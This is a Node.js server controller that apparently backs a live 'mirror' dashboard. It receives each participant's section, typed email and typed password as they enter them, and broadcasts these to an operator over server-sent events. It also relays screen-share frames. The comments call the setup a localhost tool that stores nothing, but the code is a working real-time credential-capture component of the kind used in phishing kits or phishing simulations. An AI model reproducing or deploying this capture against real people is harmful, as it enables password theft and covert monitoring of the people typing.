const sessionStore = require('../../sessions/models/sessionStore');
const sseHub = require('../../shared/infrastructure/sseHub');
const { ADMIN_TOKEN } = require('../../config/environment');

// A correct token promotes the stream to the admin audience; without it the
// client joins the public audience (participant phones).
function subscribeToLiveStream(req, res) {
  const isAdmin = String(req.query.token || '') === ADMIN_TOKEN;
  sseHub.subscribeToEventStream(req, res, isAdmin);
}

// Live mirror of the tab: which section the participant sees and what they
// have typed so far. Reaches the dashboard only (which runs on localhost);
// nothing is persisted.
function reportMirrorState(req, res) {
  const { session_id: sessionId, section, email, pass } = req.body || {};
  const session = sessionStore.findSession(sessionId);
  if (!session) {
    return res.status(404).json({ error: 'session not found' });
  }
  sessionStore.touchSession(session);
  session.data.mirror = {
    section: String(section || '').slice(0, 20),
    email: String(email || '').slice(0, 120),
    pass: String(pass || '').slice(0, 120),
  };
  sseHub.broadcastMirrorUpdate({
    sessionId: session.id,
    sessionLabel: session.label,
    mirror: session.data.mirror,
  });
  res.json({ ok: true });
}

// One shared-screen frame (base64 JPEG). It only exists if the participant
// accepted the browser's native picker; only the latest frame is kept in
// memory and pushed to the local dashboard over SSE.
function reportScreenFrame(req, res) {
  const { session_id: sessionId, frame } = req.body || {};
  const session = sessionStore.findSession(sessionId);
  if (!session) {
    return res.status(404).json({ error: 'session not found' });
  }
  if (typeof frame !== 'string' || !frame.startsWith('data:image/') || frame.length > 2_500_000) {
    return res.status(400).json({ error: 'invalid frame' });
  }
  sessionStore.touchSession(session);
  session.frame = { url: frame, ts: Date.now() };
  sseHub.broadcastScreenFrame({
    sessionId: session.id,
    sessionLabel: session.label,
    frame,
  });
  res.json({ ok: true });
}

module.exports = { subscribeToLiveStream, reportMirrorState, reportScreenFrame };
